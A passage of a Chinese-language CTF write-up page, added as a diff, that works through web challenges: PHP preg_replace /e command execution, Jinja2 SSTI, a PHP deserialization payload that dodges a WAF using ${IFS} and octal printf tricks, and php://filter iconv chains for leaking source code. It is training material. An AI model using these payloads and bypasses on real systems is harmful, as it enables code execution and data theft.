+<li>替换内容 <code>system(&quot;find+/+-name+flag*&quot;)</code> 被当作PHP代码执行。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="2-攻击过程分解"><a href="#2-攻击过程分解" class="headerlink" title="2. 攻击过程分解"></a><strong>2. 攻击过程分解</strong></h4><h5 id="1-正则匹配阶段"><a href="#1-正则匹配阶段" class="headerlink" title="(1) 正则匹配阶段"></a>(1) <strong>正则匹配阶段</strong></h5><ul>
+<li><strong>模式</strong>：<code>/.*/e</code> 匹配 <code>$subject</code>（<code>test</code>）的全部内容。</li>
+<li><strong>结果</strong>：匹配到字符串 <code>test</code>。</li>
+</ul>
+<h5 id="2-代码执行阶段"><a href="#2-代码执行阶段" class="headerlink" title="(2) 代码执行阶段"></a>(2) <strong>代码执行阶段</strong></h5><ul>
+<li><p><strong>替换操作</strong>：将匹配到的 <code>test</code> 替换为 <code>system(&quot;find+/+-name+flag*&quot;)</code>。</p>
+</li>
+<li><p><strong><code>/e</code>修饰符生效</strong>：替换内容被当作PHP代码执行，最终执行：</p>
+<p>php</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;find / -name flag*&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>命令执行结果</strong>：系统执行 <code>find</code> 命令，递归搜索根目录下所有以 <code>flag</code> 开头的文件。</p>
+</li>
+</ul>
+<h5 id="3-输出结果"><a href="#3-输出结果" class="headerlink" title="(3) 输出结果"></a>(3) <strong>输出结果</strong></h5><ul>
+<li><code>find</code> 命令的输出（如文件路径）会通过 <code>preg_replace</code> 返回给前端页面。</li>
+</ul>
+<hr>
+<h4 id="3-关键细节说明"><a href="#3-关键细节说明" class="headerlink" title="3. 关键细节说明"></a><strong>3. 关键细节说明</strong></h4><h5 id="1-为何空格用-替代？"><a href="#1-为何空格用-替代？" class="headerlink" title="(1) 为何空格用+替代？"></a>(1) <strong>为何空格用<code>+</code>替代？</strong></h5><ul>
+<li><strong>URL编码规则</strong>：URL中空格需编码为 <code>%20</code> 或 <code>+</code>，PHP的<code>$_GET</code>会自动将其转换为空格。</li>
+<li><strong>示例</strong>：<code>find+/+-name+flag*</code> → 实际执行为 <code>find / -name flag*</code>。</li>
+</ul>
+<h5 id="2-e修饰符的版本限制"><a href="#2-e修饰符的版本限制" class="headerlink" title="(2) /e修饰符的版本限制"></a>(2) <strong><code>/e</code>修饰符的版本限制</strong></h5><ul>
+<li><strong>PHP &lt; 5.5.0</strong>：支持 <code>/e</code> 修饰符，可直接利用。</li>
+<li><strong>PHP ≥ 5.5.0</strong>：<code>/e</code> 修饰符被标记为弃用，但仍可能生效。</li>
+<li><strong>PHP ≥ 7.0.0</strong>：完全移除 <code>/e</code> 修饰符，此攻击失效。</li>
+</ul>
+<h1 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a><code>Web_python_template_injection</code></h1><p>考察点：<font color="red">SSTI</font></p>
+<p>页面一篇空白，只提醒我们是模板注入：</p>
+<p><img src="/../images/image-20250325124920827-1742878162306-1.png" alt="image-20250325124920827"></p>
+<p>我们扫描，抓包都失败了，测试访问robots.txt发现报错，试试看<code>&#123;&#123;7*7&#125;&#125;</code>?：</p>
+<p><img src="/../images/image-20250325125243815-1742878364829-3.png" alt="image-20250325125243815"></p>
+<p>成功返回49，找到注入点</p>
+<p>具体的参考<code>SSTI</code>专门讲解（</p>
+<h1 id="unseping"><a href="#unseping" class="headerlink" title="unseping"></a><code>unseping</code></h1><p>考察点：<font color="red">1z反序列化</font></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现：</p>
+<p>1.<code>exec</code>存在注入漏洞</p>
+<p>2.是通过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>来进行传输的</p>
+<h3 id="于是构造："><a href="#于是构造：" class="headerlink" title="于是构造："></a>于是构造：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">array</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&#x27;ping&#x27;</span>, <span class="variable">$command</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encoded</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意点：<strong>一定要是数组</strong>不然无法传入！！！(<code>$command = array(&#39;ls&#39;);</code>)</p>
+<p><img src="/../images/image-20250326123638784-1742963799655-1.png" alt="image-20250326123638784"></p>
+<p>被<code>waf</code>了，没关系，去搜索发现可以使用<code>\</code>绕过</p>
+<h3 id="绕过："><a href="#绕过：" class="headerlink" title="\绕过："></a>\绕过：</h3><p>构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">array</span>(<span class="string">&#x27;l\s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&#x27;ping&#x27;</span>, <span class="variable">$command</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encoded</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功返回：</p>
+<p><img src="/../images/image-20250326123841311-1742963922210-3.png" alt="image-20250326123841311"></p>
+<p>空格又要怎么绕过呢？</p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过:"></a>空格绕过:</h3><p><strong>在Linux里面，<code>$&#123;IFS&#125;</code>可以代替空格</strong></p>
+<h3 id="代替绕过："><a href="#代替绕过：" class="headerlink" title="&#x2F;代替绕过："></a>&#x2F;代替绕过：</h3><p><code>$(printf$&#123;IFS&#125;&quot;\57&quot;)</code></p>
+<p> <strong>Shell 命令替换</strong>，目的是动态生成一个特殊字符（这里是斜杠 <code>/</code>），同时绕过 WAF 对某些字符的过滤。具体分解如下：</p>
+<hr>
+<h3 id="1-命令结构解析"><a href="#1-命令结构解析" class="headerlink" title="1. 命令结构解析"></a><strong>1. 命令结构解析</strong></h3><ul>
+<li>**<code>$()</code>**：Shell 中的命令替换语法，括号内的命令会先执行，输出结果替换到当前位置。</li>
+<li>**<code>printf</code>**：Shell 命令，用于格式化输出字符串。</li>
+<li>**<code>$&#123;IFS&#125;</code>**：Shell 的特殊变量，默认值为空格、换行、制表符（即 <code>$&#39; \t\n&#39;</code>），这里用来绕过对 <strong>空格</strong> 的过滤。</li>
+<li>**<code>&quot;\57&quot;</code>**：八进制转义字符，对应 ASCII 码的十进制值 <code>47</code>，即字符 <code>/</code>。</li>
+</ul>
+<h3 id="最终payload：-1"><a href="#最终payload：-1" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">array</span>(<span class="string">&#x27;c\at$&#123;IFS&#125;f\lag_1s_here$(printf$&#123;IFS&#125;&quot;\57&quot;)f\lag_831b69012c67b35f.p\hp&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&#x27;ping&#x27;</span>, <span class="variable">$command</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encoded</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="错误方法-chr法"><a href="#错误方法-chr法" class="headerlink" title="错误方法(chr法)"></a>错误方法(chr法)</h3><p>我突发奇想，能不能用chr来进行绕过？</p>
+<p>结果绕过成功了，没有返回值。。</p>
+<p>问了ai才知道：</p>
+<h4 id="为什么你的-chr-绕过失败？"><a href="#为什么你的-chr-绕过失败？" class="headerlink" title="为什么你的 chr 绕过失败？"></a><strong>为什么你的 <code>chr</code> 绕过失败？</strong></h4><p>在 PHP 反序列化中，<code>chr</code> <strong>无法直接使用</strong>，因为：</p>
+<ol>
+<li><p><strong>静态字符串特性</strong>：<br>反序列化的字符串是静态的，PHP 不会在反序列化过程中动态执行 <code>chr</code> 函数。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 你尝试构造的字符串可能类似：</span><br><span class="line">$cmd = &quot;c&quot; . chr(47) . &quot;at /flag&quot;;</span><br><span class="line">// 但序列化后的字符串是静态的 &quot;c/at /flag&quot;，chr(47) 不会被执行。</span><br></pre></td></tr></table></figure>
+
+<p>WAF 的正则表达式会直接检测到 <code>cat</code> 或 <code>/</code>，导致拦截。</p>
+</li>
+<li><p><strong>反序列化上下文限制</strong>：<br>反序列化仅还原对象属性，不会解析字符串中的 PHP 函数或语法（如 <code>chr</code>、<code>$&#123;&#125;</code> 动态变量等）。你写入的 <code>chr(47)</code> 会被当作普通字符串，而非函数调用。</p>
+</li>
+</ol>
+<hr>
+<h4 id="3-为什么-SSTI-中-chr-可以绕过？"><a href="#3-为什么-SSTI-中-chr-可以绕过？" class="headerlink" title="3. 为什么 SSTI 中 chr 可以绕过？"></a><strong>3. 为什么 SSTI 中 <code>chr</code> 可以绕过？</strong></h4><p>在 SSTI（服务端模板注入）场景中，模板引擎会 <strong>动态解析</strong> 注入的表达式。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Flask/Jinja2 模板示例</span><br><span class="line">&#123;&#123; request.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果模板引擎允许执行表达式，以下操作是可行的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;c&quot; ~ chr(47) ~ &quot;at /flag&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>动态执行</strong>：模板引擎会先计算 <code>chr(47)</code> 得到 <code>/</code>，再拼接成 <code>cat /flag</code>。</li>
+<li><strong>绕过逻辑</strong>：<br>WAF 可能直接检测 <code>cat</code> 或 <code>/</code>，但通过 <code>chr</code> 动态生成这些字符，可以绕过静态正则匹配</li>
+</ul>
+<h3 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a><code>file_include</code></h3><p>考察点：<font color="red"><strong>文件读取</strong>+<strong>利用编码转换绕过代码执行</strong></font></p>
+<p>俺寻思着，这不是很简单嘛？</p>
+<p><img src="/../images/image-20250326154941233-1742975382279-5.png" alt="image-20250326154941233"></p>
+<p>没想到啊，<code>filter</code>被WAF了，那怎么办呢！！！</p>
+<p>搜了一下，发现有<font color="red">过滤器</font>这东西</p>
+<p>原理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/过滤器链/resource=文件</span></span><br></pre></td></tr></table></figure>
+
+<p>之前构造的都是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//ctf.example.com/?file=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这次的构造是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//example/?filename=php://filter/convert.iconv.UTF-8*.UTF-32*%20/resource=check.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这里由ai讲解：</p>
+<ol>
+<li><code>convert.iconv.UTF-8.UTF-32</code> 过滤器将文件内容<strong>从UTF-8转换为UTF-32编码</strong>：<ul>
+<li><strong>UTF-8</strong>：可变长编码，1~4字节表示一个字符（如<code>&lt;?</code>对应<code>3C 3F</code>）。</li>
+<li><strong>UTF-32</strong>：固定4字节编码，每个字符占4字节（如<code>&lt;</code>变为<code>3C 00 00 00</code>）。</li>
+<li><strong>转换效果</strong>：原始PHP标签的字节结构被彻底改变，PHP引擎无法识别标签，从而不执行代码。</li>
+</ul>
+</li>
+<li><strong>绕过代码执行，输出源码</strong><br>编码转换后的内容不再是有效的PHP代码，服务器直接返回转换后的文本（即源码的UTF-32编码形式）。虽然看起来是乱码，但通过逆向转换或手动解码即可恢复原始PHP源码。</li>
+</ol>
+<h3 id="总结：利用了转码漏洞"><a href="#总结：利用了转码漏洞" class="headerlink" title="总结：利用了转码漏洞"></a>总结：利用了转码漏洞</h3><h3 id="其他常见过滤器示例"><a href="#其他常见过滤器示例" class="headerlink" title="其他常见过滤器示例"></a><strong>其他常见过滤器示例</strong></h3><p>PHP 的 <code>php://filter</code> 支持多种过滤器，以下是更多实用场景：</p>
+<h4 id="1-压缩与解压"><a href="#1-压缩与解压" class="headerlink" title="(1) 压缩与解压"></a><strong>(1) 压缩与解压</strong></h4><ul>
+<li><p><strong>场景</strong>：读取压缩后的文件，或解压已压缩的内容。</p>
+</li>
+<li><p><strong>示例</strong>：</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 压缩文件内容（Zlib）</span><br><span class="line">php://filter/zlib.deflate/resource=secret.txt</span><br><span class="line"></span><br><span class="line"># 解压并读取</span><br><span class="line">php://filter/zlib.inflate/resource=secret.txt.z</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-字符串处理"><a href="#2-字符串处理" class="headerlink" title="(2) 字符串处理"></a><strong>(2) 字符串处理</strong></h4><ul>
+<li><p><strong>场景</strong>：移除标签、转义字符。</p>
+</li>
+<li><p><strong>示例</strong>：</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 移除 HTML 标签</span><br><span class="line">php://filter/read=string.strip_tags/resource=dangerous.html</span><br><span class="line"></span><br><span class="line"># 转义特殊字符（如引号）</span><br><span class="line">php://filter/read=string.escape/resource=user_input.txt</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3-多过滤器链"><a href="#3-多过滤器链" class="headerlink" title="(3) 多过滤器链"></a><strong>(3) 多过滤器链</strong></h4><ul>
+<li><p><strong>场景</strong>：组合多个过滤器，分步处理内容。</p>
+</li>
+<li><p><strong>示例</strong>：</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 先 Base64 编码，再压缩</span><br><span class="line">php://filter/read=convert.base64-encode|zlib.deflate/resource=flag.php</span><br><span class="line"></span><br><span class="line"># 服务端返回的内容需要先解压，再 Base64 解码</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="4-字符替换"><a href="#4-字符替换" class="headerlink" title="(4) 字符替换"></a><strong>(4) 字符替换</strong></h4><ul>
+<li><p><strong>场景</strong>：替换或删除特定字符。</p>
+</li>
+<li><p><strong>示例</strong>：</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将字母 A 替换为 B</span><br><span class="line">php://filter/read=string.rot13|string.toupper/resource=file.txt</span><br><span class="line"></span><br><span class="line"># ROT13 编码后再转大写（组合操作）</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="5-加密与解密"><a href="#5-加密与解密" class="headerlink" title="(5) 加密与解密"></a><strong>(5) 加密与解密</strong></h4><ul>
+<li><p><strong>场景</strong>：简易加密数据（需配合自定义逻辑）。</p>
+</li>
+<li><p><strong>示例</strong>：</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用 XOR 加密（密钥为 &#x27;secret&#x27;）</span><br><span class="line">php://filter/read=convert.base64-encode|convert.iconv.UTF-8.UTF-16|...</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="3-不同过滤器的实战用途"><a href="#3-不同过滤器的实战用途" class="headerlink" title="3. 不同过滤器的实战用途"></a><strong>3. 不同过滤器的实战用途</strong></h3><h4 id="用途-1：绕过死亡代码"><a href="#用途-1：绕过死亡代码" class="headerlink" title="用途 1：绕过死亡代码"></a><strong>用途 1：绕过死亡代码</strong></h4><ul>
+<li><p><strong>问题</strong>：目标文件中有 <code>die()</code> 或 <code>exit()</code>，直接包含会终止程序。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用 Base64 编码跳过代码执行</span><br><span class="line">php://filter/convert.base64-encode/resource=file_with_die.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="用途-2：隐藏敏感字符"><a href="#用途-2：隐藏敏感字符" class="headerlink" title="用途 2：隐藏敏感字符"></a><strong>用途 2：隐藏敏感字符</strong></h4><ul>
+<li><p><strong>问题</strong>：WAF 过滤关键词如 <code>flag</code>。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用 UTF-16 编码 flag.php，隐藏原始文件名</span><br><span class="line">php://filter/convert.iconv.UTF-8.UTF-16/resource=flag.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="用途-3：处理不可见字符"><a href="#用途-3：处理不可见字符" class="headerlink" title="用途 3：处理不可见字符"></a><strong>用途 3：处理不可见字符</strong></h4><ul>
+<li><p><strong>问题</strong>：文件包含二进制非打印字符（如图片）。</p>
+</li>
+<li><p><strong>解决方法</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 转为可打印的 Base64</span><br><span class="line">php://filter/convert.base64-encode/resource=image.png</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="4-防御建议"><a href="#4-防御建议" class="headerlink" title="4. 防御建议"></a><strong>4. 防御建议</strong></h3><ul>
+<li><strong>禁用危险协议</strong>：在 <code>php.ini</code> 中设置 <code>allow_url_include=Off</code>。</li>
+<li><strong>输入白名单</strong>：仅允许包含指定文件，拒绝用户控制路径。</li>
+<li><strong>过滤特殊字符</strong>：检查参数中是否包含 <code>php://</code>、<code>filter</code> 等关键字。</li>
+<li><strong>日志监控</strong>：记录异常文件包含请求，及时发现攻击行为。</li>
+</ul>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
+<li><strong>两个例子都是过滤器</strong>：一个用编码转换破坏 PHP 解析，另一个用 Base64 避免代码执行。</li>
+<li><strong>扩展用法</strong>：压缩、字符串处理、加密等过滤器可应对不同场景。</li>
+<li><strong>核心逻辑</strong>：通过过滤器改变文件内容的“形态”，绕过执行直接泄露数据。</li>
+</ul>
+<h1 id="catcat-new"><a href="#catcat-new" class="headerlink" title="catcat-new"></a><code>catcat-new</code></h1><p>考察点：<font color="red">文件包含，cookie劫持</font></p>
+<h3 id="1-文件包含具体参考专门讲解"><a href="#1-文件包含具体参考专门讲解" class="headerlink" title="1.文件包含具体参考专门讲解"></a>1.文件包含具体参考专门讲解</h3><p>我们获得：</p>
